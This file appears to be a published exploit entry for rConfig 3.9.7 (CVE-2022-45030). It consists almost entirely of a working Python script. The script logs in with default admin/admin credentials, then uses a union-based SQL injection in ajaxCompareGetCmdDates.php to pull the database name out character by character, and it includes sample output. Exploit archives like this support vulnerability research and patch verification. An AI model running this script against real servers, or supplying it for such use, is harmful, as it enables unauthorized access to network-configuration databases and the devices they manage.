@@ -1,0 +1,83 @@
+id: 38404
+date: 03/31/2023
+title: rconfig 3.9.7 - Sql Injection (Authenticated) Exploit
+author: azhen
+cves: CVE-2022-45030
+
+# Exploit Title: rconfig 3.9.7 - Sql Injection (Authenticated)
+# Exploit Author: azhen
+# Vendor Homepage: https://www.rconfig.com/
+# Software Link: https://www.rconfig.com/
+# Vendor: rConfig
+# Version: <= v3.9.7
+# Tested against Server Host: Linux
+# CVE: CVE-2022-45030
+
+import requests
+import sys
+import urllib3
+urllib3.disable_warnings()
+
+s = requests.Session()
+
+# sys.argv.append("192.168.10.150") #Enter the hostname
+
+if len(sys.argv) != 2:
+    print("Usage: python3 rconfig_sqli_3.9.7.py <host>")
+    sys.exit(1)
+
+host=sys.argv[1] #Enter the hostname
+
+
+def get_data(host):
+    print("[+] Get db data...")
+    vul_url = "https://"+host+":443/lib/ajaxHandlers/ajaxCompareGetCmdDates.php?deviceId=-1&command='+union+select+concat(1000%2bord(substr({},{},1)),'-1-1')%20--%20"
+
+    query_exp = "database()"
+    result_data = ""
+
+    for i in range(1, 100):
+        burp0_headers = {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:86.0) Gecko/20100101 Firefox/86.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate"}
+        res = requests.get(vul_url.format(query_exp, i), cookies=s.cookies,verify=False)
+        # print(res.text)
+
+        a = chr(int(res.text[6:10]) - 1000)
+
+        if a == '\x00':
+            break
+
+        result_data += a
+        
+        print(result_data)
+    
+    print("[+] Database name: {}".format(result_data))
+
+    '''
+    output:
+    [+] Logging in...
+    [+] Get db data...
+    r
+    rc
+    rco
+    rcon
+    rconf
+    rconfi
+    rconfig
+    rconfigd
+    rconfigdb
+    [+] Database name: rconfigdb        
+    '''
+
+
+def login(host):
+    print("[+] Logging in...")
+    url = "https://"+host+":443/lib/crud/userprocess.php"
+    headers = {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:86.0) Gecko/20100101 Firefox/86.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded", "Origin": "https://demo.rconfig.com", "Connection": "close", "Referer": "https://demo.rconfig.com/login.php", "Upgrade-Insecure-Requests": "1"}
+    
+    data = {"user": "admin", "pass": "admin", "sublogin": "1"} #Use valid set of credentials default is set to admin/admin
+    response=s.post(url, headers=headers, cookies=s.cookies, data=data, verify=False)
+    get_data(host)
+
+login(host)
+
+#  0day.today [2023-04-03]  #
